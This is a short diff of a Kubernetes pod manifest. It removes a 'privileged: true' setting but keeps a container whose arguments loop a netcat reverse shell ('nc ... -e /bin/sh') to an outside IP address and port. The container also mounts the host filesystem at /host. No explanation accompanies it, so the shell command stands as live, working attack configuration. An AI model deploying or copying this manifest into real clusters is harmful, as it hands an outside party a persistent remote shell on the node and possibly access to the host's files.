@@ -10,7 +10,6 @@ spec:
     image: busybox
     args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
     securityContext:
-      privileged: true
     volumeMounts:
     - name: hostvolume
       mountPath: /host
